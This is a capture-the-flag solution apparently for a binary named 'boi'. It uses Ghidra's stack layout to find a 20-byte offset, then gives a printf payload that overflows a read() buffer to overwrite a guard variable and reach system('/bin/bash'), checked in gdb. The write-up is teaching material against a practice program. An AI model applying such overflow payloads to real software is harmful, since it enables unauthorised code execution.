# Soln

There's a buffer overflow in this simple program.

`read` reads in 24 bytes from the user into local variable `local_38`:

```c
read(0,&local_38,24)
```

The program calls `system("/bin/bash")` if `iStack_24` is `xcaf3baee`. But, `iStack_24`
is initialised as `0xdeadbeef`, and there's no normal execution path to change it.

Ghidra shows us the distance between `local_38` (`input`) and `iStack_24` (`target`):

```c
undefined4        Stack[-0x24]:4 target
                                              <- (pad   0x28 - 0x24):4
undefined8        Stack[-0x30]:8 local_30
undefined8        Stack[-0x38]:8 input
```

So, `0x38-0x24=0x14` (20). That is, 20 bytes of input brings us to `target` and then 4 bytes
overwrites `target`.

`read` will accept 24 bytes.

Generate a payload that overwrites `iStack_24` with `0xcaf3baee`:

```sh
printf  "AAAAAAAABBBBBBBBCCCC\xee\xba\xf3\xca" > in
```

Run program and supply payload on stdin:

```sh
gdb ./boi`

start < in
break system
c
```

And we break in `system`:

```sh
 ► 0   0x7ffff7c53b00 system
   1         0x40063e run_cmd+24
   2         0x4006b9 main+120
   3   0x7ffff7c27675 __libc_start_call_main+117
   4   0x7ffff7c27729 __libc_start_main+137
   5         0x400559 _start+41
```
